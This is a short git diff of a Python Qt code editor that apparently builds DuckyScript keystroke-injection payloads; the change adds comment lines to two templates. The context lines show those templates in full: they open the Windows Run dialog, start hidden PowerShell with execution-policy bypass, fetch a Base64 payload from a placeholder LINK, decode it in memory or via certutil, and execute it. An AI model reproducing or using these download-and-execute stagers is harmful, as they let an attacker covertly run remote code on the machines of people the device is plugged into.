@@ -453,7 +453,8 @@ class CodeEditor(QMainWindow):
             self.current_file = file_name
 
     def loadMemoryExecutionCode(self):
-        memory_execution_code = """DELAY 2000
+        memory_execution_code = """REM The script must interface with a Base64-encoded LINK for proper functionality.
+DELAY 2000
 GUI r
 DELAY 500
 STRING powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm LINK)))))
@@ -471,7 +472,8 @@ ENTER"""
         self.setColoredText(basic_code)
 
     def loadBase64Code(self):
-        base64_code = """DELAY 2000
+        base64_code = """REM The script must interface with a Base64-encoded LINK for proper functionality.
+DELAY 2000
 GUI r
 DELAY 500
 STRING powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -decode $env:USERPROFILE\e.txt $env:USERPROFILE\d.ps1;iex $env:USERPROFILE\d.ps1
